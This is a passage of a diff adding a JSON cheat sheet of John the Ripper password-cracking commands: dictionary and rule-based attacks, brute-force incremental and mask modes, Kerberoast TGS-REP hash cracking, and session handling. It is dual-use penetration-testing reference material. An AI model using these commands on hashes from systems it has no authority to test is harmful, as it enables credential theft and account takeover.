+            { "command": "john --format=krb5tgs hashes.txt", "description": "Crack Kerberoast TGS-REP hashes" },
+            { "command": "john hashes.txt", "description": "Auto-detect hash format and begin cracking with defaults" }
+          ]
+        },
+        {
+          "title": "Wordlist Attacks",
+          "commands": [
+            { "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "description": "Dictionary attack using the rockyou wordlist" },
+            { "command": "john --wordlist=custom.txt --format=raw-sha256 hashes.txt", "description": "Wordlist attack with a specific hash format" },
+            { "command": "john --wordlist=wordlist.txt --stdout | head -100", "description": "Preview the first 100 candidates without cracking" },
+            { "command": "john --wordlist=wordlist.txt --min-length=8 --max-length=16 hashes.txt", "description": "Constrain candidate passwords to 8-16 characters" }
+          ]
+        },
+        {
+          "title": "Rules & Mangling",
+          "commands": [
+            { "command": "john --wordlist=wordlist.txt --rules=best64 hashes.txt", "description": "Apply best64 rules for common password variations" },
+            { "command": "john --wordlist=wordlist.txt --rules=KoreLogic hashes.txt", "description": "Use KoreLogic competition rules for aggressive mangling" },
+            { "command": "john --wordlist=wordlist.txt --rules=Jumbo hashes.txt", "description": "Apply the extended Jumbo ruleset for broad coverage" },
+            { "command": "john --list=rules", "description": "List all available rule sections from the config" },
+            { "command": "john --wordlist=wordlist.txt --rules --stdout | wc -l", "description": "Count total candidates generated by default rules" }
+          ]
+        },
+        {
+          "title": "Incremental Mode",
+          "commands": [
+            { "command": "john --incremental hashes.txt", "description": "Full brute-force with default character set and length limits" },
+            { "command": "john --incremental=digits hashes.txt", "description": "Brute-force using only digit characters" },
+            { "command": "john --incremental=lower --max-length=8 hashes.txt", "description": "Brute-force lowercase letters up to 8 characters" },
+            { "command": "john --mask=?w?d?d?d --wordlist=wordlist.txt hashes.txt", "description": "Mask mode: each wordlist entry with 3 appended digits" }
+          ]
+        },
+        {
+          "title": "Session Management",
+          "commands": [
+            { "command": "john --session=crack1 --wordlist=wordlist.txt hashes.txt", "description": "Start a named cracking session" },
+            { "command": "john --restore=crack1", "description": "Resume a previously interrupted session by name" },
+            { "command": "john --show hashes.txt", "description": "Display all cracked passwords from the potfile" },
+            { "command": "john --show --format=raw-md5 hashes.txt", "description": "Show cracked passwords for a specific hash format" },
+            { "command": "john --pot=custom.pot --wordlist=wordlist.txt hashes.txt", "description": "Use a custom potfile instead of the default" }
+          ]
+        }
+      ]
+    }
+  ]
+}
